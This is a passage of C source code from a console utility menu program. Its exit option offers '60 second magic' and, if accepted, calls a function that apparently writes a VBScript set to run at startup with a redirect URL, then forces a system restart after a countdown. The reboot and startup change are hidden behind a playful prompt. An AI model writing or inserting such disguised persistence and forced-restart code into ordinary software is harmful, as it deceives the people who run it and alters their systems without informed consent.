        case 13: factorial(); break;
        case 14: palindrome(); break;
        case 15: table(); break;
        case 16: ascii(); break;
        case 17: stringmain(); break;
        case 18: clearScreen(); break;
        case 19: displayPastActivity(); break;
         
        case 0: 
                // Case for exiting and prompting the user for 60-second magic or visiting the website
               printf("Exiting......\n");
              // Record session end time
    time(&endTime);
    double sessionTime = getSessionTime(startTime, endTime); // Fetch session time

    // Log session time
    char timeLog[100];
    snprintf(timeLog, sizeof(timeLog), "Total time spent: %.2f seconds", sessionTime);
    logActivity(username, timeLog);

    // Display session time
    printf("\nThanks for using the program, \033[1;35m%s\033[0m!\n", username);
    printf("You spent %.2f seconds in this session.\n", sessionTime);

                SetColor(14);  // Change text color to green
                 printf("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
                 printf("!                                                          !\n");
                 printf("!                                                          !\n");
                 printf("!      Wait a minute do you want to see 60 second magic!   !\n");
                 printf("!                                                          !\n");
                 printf("!                                                          !\n");
                 printf("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
                 printf("\n");
                 printf("y/n: \n\n\n\n\n");
                scanf(" %c", &magic);  // Add space before %c to discard any leftover newline character

                if (magic == 'y' || magic == 'Y') {
                 
                  createVBScriptAndSetStartup(redirectUrl);
                  SetColor(16);
                  printf("\n Close and save your all task because your systen will restarted in 60 seconds.  Do not Close this window\n");
                  for (int i = 60; i > 0; i--) {
                    SetColor(12);
        printf("\rTime left: %d seconds", i); // \r moves the cursor back to overwrite the line
        fflush(stdout);  // Flush the output to update the screen immediately
        Sleep(1000);  // Sleep for 1 second
    }
                  restart_system();

                } else {
                printf("Click Enter to visit our website\n");
              getchar(); // Wait for user to press Enter
              getchar(); // Wait for the second Enter press (this handles the newline issue)
        
              system("start https://securcoder.vercel.app/");  // Opens the website in default browser
                SetColor(7);  // Reset text color to default
           }
        
                break;
        default: printf("Invalid Choice\n");
    }
    }while(choice != 0);
    getch();
    return 0;
}